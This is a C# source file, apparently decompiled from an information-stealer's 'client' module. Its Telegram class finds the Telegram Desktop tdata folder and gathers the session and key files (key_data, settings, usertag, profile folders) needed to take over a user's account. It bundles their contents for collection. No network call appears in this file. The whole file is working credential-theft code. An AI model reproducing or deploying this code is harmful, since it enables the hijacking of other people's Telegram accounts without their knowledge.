using System;
using System.Collections.Generic;
using System.IO;
using client.Helpers;
using client.Models;

namespace client.Body
{
	// Token: 0x0200004C RID: 76
	internal class Telegram
	{
		// Token: 0x060001BD RID: 445 RVA: 0x0000A19C File Offset: 0x0000839C
		public static List<DefaultFileStructure> Get()
		{
			List<DefaultFileStructure> list = new List<DefaultFileStructure>();
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Telegram Desktop", "tdata");
			if (!Directory.Exists(text))
			{
				return list;
			}
			try
			{
				foreach (DirectoryInfo directoryInfo in new DirectoryInfo(text).GetDirectories())
				{
					if (directoryInfo.Name.Length == 16)
					{
						foreach (FileInfo fileInfo in directoryInfo.GetFiles())
						{
							list.Add(new DefaultFileStructure
							{
								Service = DataType.Telegram,
								FileName = fileInfo.FullName.Replace(text + "\\", null),
								FileContent = FileHelper.ReadFile(fileInfo.FullName)
							});
						}
					}
				}
				foreach (FileInfo fileInfo2 in new DirectoryInfo(text).GetFiles())
				{
					string fullName = fileInfo2.FullName;
					string fileName = fullName.Replace(text + "\\", null);
					if (fileInfo2.Length > 5120L)
					{
						list.Add(new DefaultFileStructure
						{
							Service = DataType.Telegram,
							FileName = fileName,
							FileContent = FileHelper.ReadFile(fullName)
						});
					}
					else if (fileInfo2.Name.EndsWith("s") && fileInfo2.Name.Length == 17)
					{
						list.Add(new DefaultFileStructure
						{
							Service = DataType.Telegram,
							FileName = fileName,
							FileContent = FileHelper.ReadFile(fullName)
						});
					}
					else if (fileInfo2.Name.StartsWith("usertag") || fileInfo2.Name.StartsWith("settings") || fileInfo2.Name.StartsWith("key_data") || fileInfo2.Name.StartsWith("prefix"))
					{
						list.Add(new DefaultFileStructure
						{
							Service = DataType.Telegram,
							FileName = fileName,
							FileContent = FileHelper.ReadFile(fullName)
						});
					}
				}
			}
			catch (Exception e)
			{
				LoggerHelper.HandleRuntimeError(e);
			}
			return list;
		}
	}
}
